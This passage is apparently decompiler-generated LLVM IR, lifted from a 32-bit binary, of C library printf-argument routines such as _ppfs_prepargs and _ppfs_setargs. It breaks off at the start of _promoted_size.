  %v1_804e818 = add i32 %v0_804e818, 4
  store i32 %v1_804e818, i32* %eax.global-to-local, align 4
  %v0_804e81b = load i32, i32* %edx.global-to-local, align 4
  %v1_804e81b = add i32 %v0_804e81b, -1
  %v8_804e81b = icmp eq i32 %v1_804e81b, 0
  store i32 %v1_804e81b, i32* %edx.global-to-local, align 4
  %v1_804e81c = icmp eq i1 %v8_804e81b, false
  br i1 %v1_804e81c, label %dec_label_pc_804e812, label %dec_label_pc_804e81e

dec_label_pc_804e81e:                             ; preds = %dec_label_pc_804e812
  %v0_804e81e = load i32, i32* @esi, align 4
  store i32 %v0_804e81e, i32* %eax.global-to-local, align 4
  %v1_804e84920 = inttoptr i32 %v0_804e81e to i8*
  %v2_804e84921 = load i8, i8* %v1_804e84920, align 1
  %v3_804e84922 = zext i8 %v2_804e84921 to i32
  %v5_804e84923 = and i32 %v1_804e81b, -256
  %v6_804e84924 = or i32 %v3_804e84922, %v5_804e84923
  store i32 %v6_804e84924, i32* %edx.global-to-local, align 4
  %v4_804e84b25 = icmp eq i8 %v2_804e84921, 0
  %v1_804e84d26 = icmp eq i1 %v4_804e84b25, false
  br i1 %v1_804e84d26, label %dec_label_pc_804e827, label %dec_label_pc_804e84f

dec_label_pc_804e827:                             ; preds = %dec_label_pc_804e81e, %dec_label_pc_804e849.backedge
  %v6_804e84929 = phi i32 [ %v6_804e849, %dec_label_pc_804e849.backedge ], [ %v6_804e84924, %dec_label_pc_804e81e ]
  %v2_804e84928 = phi i8 [ %v2_804e849, %dec_label_pc_804e849.backedge ], [ %v2_804e84921, %dec_label_pc_804e81e ]
  %v0_804e82c27 = phi i32 [ %v0_804e82c.be, %dec_label_pc_804e849.backedge ], [ %v0_804e81e, %dec_label_pc_804e81e ]
  %v10_804e827 = icmp eq i8 %v2_804e84928, 37
  %v1_804e82a = icmp eq i1 %v10_804e827, false
  br i1 %v1_804e82a, label %dec_label_pc_804e848, label %dec_label_pc_804e82c

dec_label_pc_804e82c:                             ; preds = %dec_label_pc_804e827
  %v1_804e82c = add i32 %v0_804e82c27, 1
  store i32 %v1_804e82c, i32* %eax.global-to-local, align 4
  %v1_804e82d = inttoptr i32 %v1_804e82c to i8*
  %v2_804e82d = load i8, i8* %v1_804e82d, align 1
  %v11_804e82d = icmp eq i8 %v2_804e82d, 37
  br i1 %v11_804e82d, label %dec_label_pc_804e848, label %dec_label_pc_804e832

dec_label_pc_804e832:                             ; preds = %dec_label_pc_804e82c
  %v1_804e835 = load i32, i32* @ebx, align 4
  %v2_804e835 = inttoptr i32 %v1_804e835 to i32*
  store i32 %v1_804e82c, i32* %v2_804e835, align 4
  %v0_804e837 = load i32, i32* @ebx, align 4
  %v1_804e838 = inttoptr i32 %v0_804e837 to i32*
  %v2_804e838 = call i32 @_ppfs_parsespec(i32* %v1_804e838)
  store i32 %v2_804e838, i32* %eax.global-to-local, align 4
  %v2_804e840 = icmp slt i32 %v2_804e838, 0
  br i1 %v2_804e840, label %dec_label_pc_804e853, label %dec_label_pc_804e844

dec_label_pc_804e844:                             ; preds = %dec_label_pc_804e832
  %v0_804e844 = load i32, i32* @ebx, align 4
  %v1_804e844 = inttoptr i32 %v0_804e844 to i32*
  %v2_804e844 = load i32, i32* %v1_804e844, align 4
  %v4_804e849.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e849.backedge

dec_label_pc_804e848:                             ; preds = %dec_label_pc_804e82c, %dec_label_pc_804e827
  %v0_804e848 = phi i32 [ %v1_804e82c, %dec_label_pc_804e82c ], [ %v0_804e82c27, %dec_label_pc_804e827 ]
  %v1_804e848 = add i32 %v0_804e848, 1
  br label %dec_label_pc_804e849.backedge

dec_label_pc_804e849.backedge:                    ; preds = %dec_label_pc_804e848, %dec_label_pc_804e844
  %v4_804e849.be = phi i32 [ %v4_804e849.pre.pre, %dec_label_pc_804e844 ], [ %v6_804e84929, %dec_label_pc_804e848 ]
  %v0_804e82c.be = phi i32 [ %v2_804e844, %dec_label_pc_804e844 ], [ %v1_804e848, %dec_label_pc_804e848 ]
  store i32 %v0_804e82c.be, i32* %eax.global-to-local, align 4
  %v1_804e849 = inttoptr i32 %v0_804e82c.be to i8*
  %v2_804e849 = load i8, i8* %v1_804e849, align 1
  %v3_804e849 = zext i8 %v2_804e849 to i32
  %v5_804e849 = and i32 %v4_804e849.be, -256
  %v6_804e849 = or i32 %v3_804e849, %v5_804e849
  store i32 %v6_804e849, i32* %edx.global-to-local, align 4
  %v4_804e84b = icmp eq i8 %v2_804e849, 0
  %v1_804e84d = icmp eq i1 %v4_804e84b, false
  br i1 %v1_804e84d, label %dec_label_pc_804e827, label %dec_label_pc_804e849.dec_label_pc_804e84f_crit_edge

dec_label_pc_804e849.dec_label_pc_804e84f_crit_edge: ; preds = %dec_label_pc_804e849.backedge
  %v0_804e84f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e84f

dec_label_pc_804e84f:                             ; preds = %dec_label_pc_804e849.dec_label_pc_804e84f_crit_edge, %dec_label_pc_804e81e
  %v0_804e84f = phi i32 [ %v0_804e84f.pre, %dec_label_pc_804e849.dec_label_pc_804e84f_crit_edge ], [ %v0_804e81e, %dec_label_pc_804e81e ]
  %v1_804e84f = load i32, i32* @ebx, align 4
  %v2_804e84f = inttoptr i32 %v1_804e84f to i32*
  store i32 %v0_804e84f, i32* %v2_804e84f, align 4
  br label %dec_label_pc_804e853

dec_label_pc_804e853:                             ; preds = %dec_label_pc_804e832, %dec_label_pc_804e84f
  %storemerge = phi i32 [ 0, %dec_label_pc_804e84f ], [ -1, %dec_label_pc_804e832 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804e853 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e853, i32* @edx, align 4
  %v2_804e854 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e854, i32* @ebx, align 4
  store i32 %v0_804e7e8, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804e849, { 1, 0 }
  uselistorder i8 %v2_804e849, { 1, 2, 0 }
  uselistorder i32 %v0_804e82c.be, { 2, 1, 0 }
  uselistorder i32 %v0_804e82c27, { 1, 0 }
  uselistorder i32 %v0_804e81e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e81b, { 0, 2, 1 }
  uselistorder i32 %v1_804e818, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e853, { 1, 0 }
  uselistorder label %dec_label_pc_804e827, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e858 = load i32, i32* @esi, align 4
  %v0_804e859 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e865 = add i32 %arg1, 24
  %v2_804e865 = inttoptr i32 %v1_804e865 to i32*
  %v3_804e865 = load i32, i32* %v2_804e865, align 4
  %v2_804e868 = add i32 %arg1, 76
  %v3_804e868 = inttoptr i32 %v2_804e868 to i32*
  store i32 %arg2, i32* %v3_804e868, align 4
  %tmp8 = icmp slt i32 %v3_804e865, 1
  br i1 %tmp8, label %dec_label_pc_804e896, label %dec_label_pc_804e86f

dec_label_pc_804e86f:                             ; preds = %entry
  %v1_804e872 = load i32, i32* @ebx, align 4
  %v2_804e872 = add i32 %v1_804e872, 28
  %v3_804e872 = inttoptr i32 %v2_804e872 to i32*
  store i32 %v3_804e865, i32* %v3_804e872, align 4
  %v0_804e875 = load i32, i32* @ebx, align 4
  %v1_804e875 = add i32 %v0_804e875, 24
  %v2_804e875 = inttoptr i32 %v1_804e875 to i32*
  store i32 0, i32* %v2_804e875, align 4
  %v0_804e87c = load i32, i32* @ebx, align 4
  %v1_804e87c = add i32 %v0_804e87c, 4
  %v2_804e87c = inttoptr i32 %v1_804e87c to i32*
  store i32 0, i32* %v2_804e87c, align 4
  %v0_804e883 = load i32, i32* @ebx, align 4
  %v1_804e883 = add i32 %v0_804e883, 8
  %v2_804e883 = inttoptr i32 %v1_804e883 to i32*
  store i32 0, i32* %v2_804e883, align 4
  %v0_804e88a = load i32, i32* @ebx, align 4
  %v1_804e88b = call i32 @_ppfs_setargs(i32 %v0_804e88a)
  %v1_804e890 = load i32, i32* @ebx, align 4
  %v2_804e890 = add i32 %v1_804e890, 24
  %v3_804e890 = inttoptr i32 %v2_804e890 to i32*
  store i32 %v3_804e865, i32* %v3_804e890, align 4
  br label %dec_label_pc_804e896

dec_label_pc_804e896:                             ; preds = %entry, %dec_label_pc_804e86f
  %v2_804e896 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e859, i32* @ebx, align 4
  store i32 %v0_804e858, i32* @esi, align 4
  ret i32 %v2_804e896

; uselistorder directives
  uselistorder i32 %v3_804e865, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e896, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e89d = load i32, i32* @ebx, align 4
  store i32 %v0_804e89d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804e8a2 = add i32 %arg1, 80
  store i32 %v1_804e8a2, i32* %ebx.global-to-local, align 4
  %v1_804e8a5 = add i32 %arg1, 24
  %v2_804e8a5 = inttoptr i32 %v1_804e8a5 to i32*
  %v3_804e8a5 = load i32, i32* %v2_804e8a5, align 4
  %v4_804e8a5 = icmp eq i32 %v3_804e8a5, 0
  %v1_804e8a9 = icmp eq i1 %v4_804e8a5, false
  %v1_804e95f = add i32 %arg1, 8
  %v2_804e95f = inttoptr i32 %v1_804e95f to i32*
  %v3_804e95f = load i32, i32* %v2_804e95f, align 4
  %v8_804e95f = icmp eq i32 %v3_804e95f, -2147483648
  %v1_804e966 = icmp eq i1 %v8_804e95f, false
  br i1 %v1_804e8a9, label %dec_label_pc_804e95f, label %dec_label_pc_804e8af

dec_label_pc_804e8af:                             ; preds = %entry
  br i1 %v1_804e966, label %dec_label_pc_804e8c9, label %dec_label_pc_804e8b8

dec_label_pc_804e8b8:                             ; preds = %dec_label_pc_804e8af
  %v1_804e8b8 = add i32 %arg1, 76
  %v2_804e8b8 = inttoptr i32 %v1_804e8b8 to i32*
  %v3_804e8b8 = load i32, i32* %v2_804e8b8, align 4
  store i32 %v3_804e8b8, i32* %eax.global-to-local, align 4
  %v1_804e8bb = add i32 %v3_804e8b8, 4
  store i32 %v1_804e8bb, i32* %edx.global-to-local, align 4
  store i32 %v1_804e8bb, i32* %v2_804e8b8, align 4
  %v0_804e8c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8c1 = inttoptr i32 %v0_804e8c1 to i32*
  %v2_804e8c1 = load i32, i32* %v1_804e8c1, align 4
  store i32 %v2_804e8c1, i32* %eax.global-to-local, align 4
  %v1_804e8c3 = load i32, i32* @ecx, align 4
  %v2_804e8c3 = add i32 %v1_804e8c3, 80
  %v3_804e8c3 = inttoptr i32 %v2_804e8c3 to i32*
  store i32 %v2_804e8c1, i32* %v3_804e8c3, align 4
  %v0_804e8c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8c6 = load i32, i32* @ecx, align 4
  %v2_804e8c6 = add i32 %v1_804e8c6, 8
  %v3_804e8c6 = inttoptr i32 %v2_804e8c6 to i32*
  store i32 %v0_804e8c6, i32* %v3_804e8c6, align 4
  %v0_804e8c9.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e8c9

dec_label_pc_804e8c9:                             ; preds = %dec_label_pc_804e8af, %dec_label_pc_804e8b8
  %v1_804e8d8 = phi i32 [ %arg1, %dec_label_pc_804e8af ], [ %v0_804e8c9.pre, %dec_label_pc_804e8b8 ]
  %v1_804e8c9 = add i32 %v1_804e8d8, 4
  %v2_804e8c9 = inttoptr i32 %v1_804e8c9 to i32*
  %v3_804e8c9 = load i32, i32* %v2_804e8c9, align 4
  %v8_804e8c9 = icmp eq i32 %v3_804e8c9, -2147483648
  %v1_804e8d0 = icmp eq i1 %v8_804e8c9, false
  br i1 %v1_804e8d0, label %dec_label_pc_804e8e3, label %dec_label_pc_804e8d2

dec_label_pc_804e8d2:                             ; preds = %dec_label_pc_804e8c9
  %v1_804e8d2 = add i32 %v1_804e8d8, 76
  %v2_804e8d2 = inttoptr i32 %v1_804e8d2 to i32*
  %v3_804e8d2 = load i32, i32* %v2_804e8d2, align 4
  store i32 %v3_804e8d2, i32* %eax.global-to-local, align 4
  %v1_804e8d5 = add i32 %v3_804e8d2, 4
  store i32 %v1_804e8d5, i32* %edx.global-to-local, align 4
  store i32 %v1_804e8d5, i32* %v2_804e8d2, align 4
  %v0_804e8db = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8db = inttoptr i32 %v0_804e8db to i32*
  %v2_804e8db = load i32, i32* %v1_804e8db, align 4
  store i32 %v2_804e8db, i32* %eax.global-to-local, align 4
  %v1_804e8dd = load i32, i32* @ecx, align 4
  %v2_804e8dd = add i32 %v1_804e8dd, 80
  %v3_804e8dd = inttoptr i32 %v2_804e8dd to i32*
  store i32 %v2_804e8db, i32* %v3_804e8dd, align 4
  %v0_804e8e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8e0 = load i32, i32* @ecx, align 4
  %v2_804e8e0 = add i32 %v1_804e8e0, 4
  %v3_804e8e0 = inttoptr i32 %v2_804e8e0 to i32*
  store i32 %v0_804e8e0, i32* %v3_804e8e0, align 4
  %v1_804e95817.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e8e3

dec_label_pc_804e8e3:                             ; preds = %dec_label_pc_804e8c9, %dec_label_pc_804e8d2
  %v1_804e95817 = phi i32 [ %v1_804e8d8, %dec_label_pc_804e8c9 ], [ %v1_804e95817.pre, %dec_label_pc_804e8d2 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e95818 = add i32 %v1_804e95817, 28
  %v3_804e95819 = inttoptr i32 %v2_804e95818 to i32*
  %v4_804e95820 = load i32, i32* %v3_804e95819, align 4
  %v5_804e95b21 = icmp sgt i32 %v4_804e95820, 0
  br i1 %v5_804e95b21, label %dec_label_pc_804e8e7, label %dec_label_pc_804e98d.loopexit

dec_label_pc_804e8e7:                             ; preds = %dec_label_pc_804e8e3, %dec_label_pc_804e957
  %v1_804e95823 = phi i32 [ %v1_804e958, %dec_label_pc_804e957 ], [ %v1_804e95817, %dec_label_pc_804e8e3 ]
  %v1_804e8e722 = phi i32 [ %v1_804e957, %dec_label_pc_804e957 ], [ 0, %dec_label_pc_804e8e3 ]
  %v2_804e8e7 = mul i32 %v1_804e8e722, 4
  %v3_804e8e7 = add i32 %v2_804e8e7, 40
  %v4_804e8e7 = add i32 %v3_804e8e7, %v1_804e95823
  %v5_804e8e7 = inttoptr i32 %v4_804e8e7 to i32*
  %v6_804e8e7 = load i32, i32* %v5_804e8e7, align 4
  store i32 %v6_804e8e7, i32* %eax.global-to-local, align 4
  %v1_804e8eb = add i32 %v6_804e8e7, -8
  %v9_804e8eb = icmp eq i32 %v1_804e8eb, 0
  br i1 %v9_804e8eb, label %dec_label_pc_804e957, label %dec_label_pc_804e8f0

dec_label_pc_804e8f0:                             ; preds = %dec_label_pc_804e8e7
  %v10_804e8eb = icmp slt i32 %v1_804e8eb, 0
  %v6_804e8eb = sub i32 7, %v6_804e8e7
  %v7_804e8eb = and i32 %v6_804e8eb, %v6_804e8e7
  %v8_804e8eb = icmp slt i32 %v7_804e8eb, 0
  %v1_804e8f0 = add i32 %v1_804e95823, 76
  %v2_804e8f0 = inttoptr i32 %v1_804e8f0 to i32*
  %v3_804e8f0 = load i32, i32* %v2_804e8f0, align 4
  store i32 %v3_804e8f0, i32* %edx.global-to-local, align 4
  %v3_804e8f3 = icmp eq i1 %v10_804e8eb, %v8_804e8eb
  br i1 %v3_804e8f3, label %dec_label_pc_804e903, label %dec_label_pc_804e8f5

dec_label_pc_804e8f5:                             ; preds = %dec_label_pc_804e8f0
  %tmp15 = icmp slt i32 %v6_804e8e7, 3
  %v9_804e8fc = icmp eq i32 %v6_804e8e7, 7
  %v1_804e8ff = icmp eq i1 %v9_804e8fc, false
  %or.cond = or i1 %tmp15, %v1_804e8ff
  br i1 %or.cond, label %dec_label_pc_804e94a, label %dec_label_pc_804e92c

dec_label_pc_804e903:                             ; preds = %dec_label_pc_804e8f0
  %tmp16 = icmp sgt i32 %v6_804e8e7, 1024
  br i1 %tmp16, label %dec_label_pc_804e90c, label %dec_label_pc_804e94a

dec_label_pc_804e90c:                             ; preds = %dec_label_pc_804e903
  %v6_804e90c = icmp eq i32 %v6_804e8e7, 2048
  br i1 %v6_804e90c, label %dec_label_pc_804e91c, label %dec_label_pc_804e913

dec_label_pc_804e913:                             ; preds = %dec_label_pc_804e90c
  %v9_804e913 = icmp eq i32 %v6_804e8e7, 2055
  %v1_804e918 = icmp eq i1 %v9_804e913, false
  br i1 %v1_804e918, label %dec_label_pc_804e94a, label %dec_label_pc_804e93b

dec_label_pc_804e91c:                             ; preds = %dec_label_pc_804e90c
  %v1_804e91c = add i32 %v3_804e8f0, 8
  store i32 %v1_804e91c, i32* %eax.global-to-local, align 4
  store i32 %v1_804e91c, i32* %v2_804e8f0, align 4
  %v0_804e922 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e922 = inttoptr i32 %v0_804e922 to i32*
  %v2_804e922 = load i32, i32* %v1_804e922, align 4
  store i32 %v2_804e922, i32* %eax.global-to-local, align 4
  %v1_804e924 = add i32 %v0_804e922, 4
  %v2_804e924 = inttoptr i32 %v1_804e924 to i32*
  %v3_804e924 = load i32, i32* %v2_804e924, align 4
  store i32 %v3_804e924, i32* %edx.global-to-local, align 4
  %v1_804e927 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e927 = add i32 %v1_804e927, 4
  %v3_804e927 = inttoptr i32 %v2_804e927 to i32*
  store i32 %v3_804e924, i32* %v3_804e927, align 4
  %v0_804e952.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e952

dec_label_pc_804e92c:                             ; preds = %dec_label_pc_804e8f5
  %v3_804e92c = load i32, i32* %v2_804e8f0, align 4
  store i32 %v3_804e92c, i32* %edx.global-to-local, align 4
  %v1_804e92f = add i32 %v3_804e92c, 8
  store i32 %v1_804e92f, i32* %eax.global-to-local, align 4
  store i32 %v1_804e92f, i32* %v2_804e8f0, align 4
  %v0_804e935 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e935 = inttoptr i32 %v0_804e935 to double*
  %v2_804e935 = load double, double* %v1_804e935, align 4
  %v2_804e937 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e937 = inttoptr i32 %v2_804e937 to double*
  store double %v2_804e935, double* %v4_804e937, align 4
  br label %dec_label_pc_804e954

dec_label_pc_804e93b:                             ; preds = %dec_label_pc_804e913
  %v3_804e93b = load i32, i32* %v2_804e8f0, align 4
  store i32 %v3_804e93b, i32* %edx.global-to-local, align 4
  %v1_804e93e = add i32 %v3_804e93b, 12
  store i32 %v1_804e93e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e93e, i32* %v2_804e8f0, align 4
  %v0_804e944 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e944 = inttoptr i32 %v0_804e944 to x86_fp80*
  %v2_804e944 = load x86_fp80, x86_fp80* %v1_804e944, align 4
  %v2_804e946 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e946 = inttoptr i32 %v2_804e946 to x86_fp80*
  store x86_fp80 %v2_804e944, x86_fp80* %v3_804e946, align 4
  br label %dec_label_pc_804e954

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e8f5, %dec_label_pc_804e903, %dec_label_pc_804e913
  %v1_804e94a = add i32 %v3_804e8f0, 4
  store i32 %v1_804e94a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e94a, i32* %v2_804e8f0, align 4
  %v0_804e950 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e950 = inttoptr i32 %v0_804e950 to i32*
  %v2_804e950 = load i32, i32* %v1_804e950, align 4
  store i32 %v2_804e950, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e952

dec_label_pc_804e952:                             ; preds = %dec_label_pc_804e91c, %dec_label_pc_804e94a
  %v0_804e952 = phi i32 [ %v0_804e952.pre, %dec_label_pc_804e91c ], [ %v2_804e950, %dec_label_pc_804e94a ]
  %v1_804e952 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e952 = inttoptr i32 %v1_804e952 to i32*
  store i32 %v0_804e952, i32* %v2_804e952, align 4
  %v0_804e954.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e954

dec_label_pc_804e954:                             ; preds = %dec_label_pc_804e93b, %dec_label_pc_804e92c, %dec_label_pc_804e952
  %v0_804e954 = phi i32 [ %v2_804e946, %dec_label_pc_804e93b ], [ %v2_804e937, %dec_label_pc_804e92c ], [ %v0_804e954.pre, %dec_label_pc_804e952 ]
  %v1_804e954 = add i32 %v0_804e954, 12
  store i32 %v1_804e954, i32* %ebx.global-to-local, align 4
  %v0_804e957.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e958.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e957

dec_label_pc_804e957:                             ; preds = %dec_label_pc_804e8e7, %dec_label_pc_804e954
  %v1_804e958 = phi i32 [ %v1_804e95823, %dec_label_pc_804e8e7 ], [ %v1_804e958.pre, %dec_label_pc_804e954 ]
  %v0_804e957 = phi i32 [ %v1_804e8e722, %dec_label_pc_804e8e7 ], [ %v0_804e957.pre, %dec_label_pc_804e954 ]
  %v1_804e957 = add i32 %v0_804e957, 1
  store i32 %v1_804e957, i32* %esi.global-to-local, align 4
  %v2_804e958 = add i32 %v1_804e958, 28
  %v3_804e958 = inttoptr i32 %v2_804e958 to i32*
  %v4_804e958 = load i32, i32* %v3_804e958, align 4
  %v5_804e95b = icmp slt i32 %v1_804e957, %v4_804e958
  br i1 %v5_804e95b, label %dec_label_pc_804e8e7, label %dec_label_pc_804e98d.loopexit

dec_label_pc_804e95f:                             ; preds = %entry
  br i1 %v1_804e966, label %dec_label_pc_804e976, label %dec_label_pc_804e968

dec_label_pc_804e968:                             ; preds = %dec_label_pc_804e95f
  %v1_804e968 = add i32 %arg1, 36
  %v2_804e968 = inttoptr i32 %v1_804e968 to i8*
  %v3_804e968 = load i8, i8* %v2_804e968, align 1
  %v2_804e96c = zext i8 %v3_804e968 to i32
  %v3_804e96c = mul nuw nsw i32 %v2_804e96c, 12
  store i32 %v3_804e96c, i32* %eax.global-to-local, align 4
  %v2_804e96f = add i32 %arg1, 68
  %v3_804e96f = add i32 %v2_804e96f, %v3_804e96c
  %v4_804e96f = inttoptr i32 %v3_804e96f to i32*
  %v5_804e96f = load i32, i32* %v4_804e96f, align 4
  store i32 %v5_804e96f, i32* %eax.global-to-local, align 4
  store i32 %v5_804e96f, i32* %v2_804e95f, align 4
  %v0_804e976.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e976

dec_label_pc_804e976:                             ; preds = %dec_label_pc_804e95f, %dec_label_pc_804e968
  %v1_804e98a = phi i32 [ %arg1, %dec_label_pc_804e95f ], [ %v0_804e976.pre, %dec_label_pc_804e968 ]
  %v1_804e976 = add i32 %v1_804e98a, 4
  %v2_804e976 = inttoptr i32 %v1_804e976 to i32*
  %v3_804e976 = load i32, i32* %v2_804e976, align 4
  %v8_804e976 = icmp eq i32 %v3_804e976, -2147483648
  %v1_804e97d = icmp eq i1 %v8_804e976, false
  br i1 %v1_804e97d, label %dec_label_pc_804e98d, label %dec_label_pc_804e97f

dec_label_pc_804e97f:                             ; preds = %dec_label_pc_804e976
  %v1_804e97f = add i32 %v1_804e98a, 37
  %v2_804e97f = inttoptr i32 %v1_804e97f to i8*
  %v3_804e97f = load i8, i8* %v2_804e97f, align 1
  %v2_804e983 = zext i8 %v3_804e97f to i32
  %v3_804e983 = mul nuw nsw i32 %v2_804e983, 12
  store i32 %v3_804e983, i32* %eax.global-to-local, align 4
  %v1_804e986 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e986 = add nsw i32 %v3_804e983, -12
  %v3_804e986 = add i32 %v2_804e986, %v1_804e986
  %v4_804e986 = inttoptr i32 %v3_804e986 to i32*
  %v5_804e986 = load i32, i32* %v4_804e986, align 4
  store i32 %v5_804e986, i32* %eax.global-to-local, align 4
  store i32 %v5_804e986, i32* %v2_804e976, align 4
  %v0_804e98d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e98d

dec_label_pc_804e98d.loopexit:                    ; preds = %dec_label_pc_804e957, %dec_label_pc_804e8e3
  %v1_804e958.lcssa = phi i32 [ %v1_804e95817, %dec_label_pc_804e8e3 ], [ %v1_804e958, %dec_label_pc_804e957 ]
  br label %dec_label_pc_804e98d

dec_label_pc_804e98d:                             ; preds = %dec_label_pc_804e98d.loopexit, %dec_label_pc_804e976, %dec_label_pc_804e97f
  %v10_804e994 = phi i32 [ %v1_804e958.lcssa, %dec_label_pc_804e98d.loopexit ], [ %v1_804e98a, %dec_label_pc_804e976 ], [ %v0_804e98d.pre, %dec_label_pc_804e97f ]
  %v1_804e98d = add i32 %v10_804e994, 8
  %v2_804e98d = inttoptr i32 %v1_804e98d to i32*
  %v3_804e98d = load i32, i32* %v2_804e98d, align 4
  store i32 %v3_804e98d, i32* %eax.global-to-local, align 4
  %v2_804e990 = icmp slt i32 %v3_804e98d, 0
  %v1_804e992 = icmp eq i1 %v2_804e990, false
  br i1 %v1_804e992, label %dec_label_pc_804e9a8, label %dec_label_pc_804e994

dec_label_pc_804e994:                             ; preds = %dec_label_pc_804e98d
  %v1_804e994 = add i32 %v10_804e994, 16
  %v2_804e994 = inttoptr i32 %v1_804e994 to i32*
  %v3_804e994 = load i32, i32* %v2_804e994, align 4
  %v4_804e994 = or i32 %v3_804e994, 8
  store i32 %v4_804e994, i32* %v2_804e994, align 4
  %v0_804e998 = load i32, i32* @ecx, align 4
  %v1_804e998 = add i32 %v0_804e998, 16
  %v2_804e998 = inttoptr i32 %v1_804e998 to i32*
  %v3_804e998 = load i32, i32* %v2_804e998, align 4
  %v4_804e998 = and i32 %v3_804e998, -2
  store i32 %v4_804e998, i32* %v2_804e998, align 4
  %v0_804e99c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e99c = sub i32 0, %v0_804e99c
  store i32 %v1_804e99c, i32* %eax.global-to-local, align 4
  %v1_804e99e = load i32, i32* @ecx, align 4
  %v2_804e99e = add i32 %v1_804e99e, 8
  %v3_804e99e = inttoptr i32 %v2_804e99e to i32*
  store i32 %v1_804e99c, i32* %v3_804e99e, align 4
  %v0_804e9a1 = load i32, i32* @ecx, align 4
  %v1_804e9a1 = add i32 %v0_804e9a1, 20
  %v2_804e9a1 = inttoptr i32 %v1_804e9a1 to i32*
  store i32 32, i32* %v2_804e9a1, align 4
  %v0_804e9aa.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e9a8

dec_label_pc_804e9a8:                             ; preds = %dec_label_pc_804e98d, %dec_label_pc_804e994
  %v0_804e9aa = phi i32 [ %v3_804e98d, %dec_label_pc_804e98d ], [ %v0_804e9aa.pre, %dec_label_pc_804e994 ]
  %v2_804e9a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e9a8, i32* @ebx, align 4
  ret i32 %v0_804e9aa

; uselistorder directives
  uselistorder i32 %v3_804e983, { 1, 0 }
  uselistorder i32 %v3_804e96c, { 1, 0 }
  uselistorder i32 %v1_804e957, { 2, 1, 0 }
  uselistorder i32 %v1_804e958, { 0, 2, 1 }
  uselistorder i32 %v3_804e8f0, { 1, 0, 2 }
  uselistorder i32* %v2_804e8f0, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804e8eb, { 1, 0 }
  uselistorder i32 %v6_804e8e7, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804e8e722, { 1, 0 }
  uselistorder i1 %v1_804e966, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804e9a8, { 1, 0 }
  uselistorder label %dec_label_pc_804e98d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e976, { 1, 0 }
  uselistorder label %dec_label_pc_804e957, { 1, 0 }
  uselistorder label %dec_label_pc_804e954, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e952, { 1, 0 }
  uselistorder label %dec_label_pc_804e94a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e8e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e8e3, { 1, 0 }
  uselistorder label %dec_label_pc_804e8c9, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e9ac = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e9b3

dec_label_pc_804e9b3:                             ; preds = %dec_label_pc_804e9b3, %entry
